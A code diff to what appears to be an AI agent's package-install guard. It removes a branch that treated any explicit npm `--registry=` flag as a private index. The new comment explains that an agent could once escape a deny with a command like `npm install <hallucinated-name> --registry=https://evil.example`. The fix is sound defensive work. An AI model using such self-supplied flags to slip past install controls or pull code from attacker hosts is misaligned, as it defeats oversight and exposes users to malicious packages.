@@ -452,13 +452,25 @@ function applySpecAmbient(spec: PackageSpec, cwd: string, env: NodeJS.ProcessEnv
       // Only a genuine `--registry=` flag reaches here for npm (see
       // package-verifier.ts's extraction — npm's flag table has no
       // next-token entry, so only the `=`-joined form is captured).
+      //
+      // ONLY the ambient-private + forced-public shape (dependency
+      // confusion) is handled here. An explicit `--registry=<anything
+      // else>` with NO corroborating ambient config is deliberately left
+      // UNCHANGED (falls through to `return spec` below) — that flag's
+      // value is written by whoever is issuing the command, i.e. the same
+      // agent this rule polices, not by a team ahead of time the way an
+      // `.npmrc` file is. Downgrading on that alone would let
+      // `npm install <hallucinated-name> --registry=https://evil.example`
+      // permanently escape a real deny with a self-supplied flag and no
+      // on-disk corroboration at all — the deny-escape this branch used to
+      // have before this comment. Compare cargo's `--registry <name>`
+      // handling below, which is safe BECAUSE it requires the name to
+      // already appear in a `[registries.<name>]` table read from disk —
+      // an agent-supplied flag alone can't fabricate that.
       if (ambientPrivate && isExactPublicNpmHost(spec.explicitRegistryOverride)) {
         return { ...spec, dependencyConfusionRisk: true, ambientSource: ambient.source }
       }
-      if (!isPublicNpmRegistry(spec.explicitRegistryOverride)) {
-        return { ...spec, privateIndex: true, ambientSource: 'explicit --registry flag' }
-      }
-      return spec // explicit flag names the public registry, no ambient conflict
+      return spec
     }
     if (ambientPrivate) return { ...spec, privateIndex: true, ambientSource: ambient.source }
     return spec
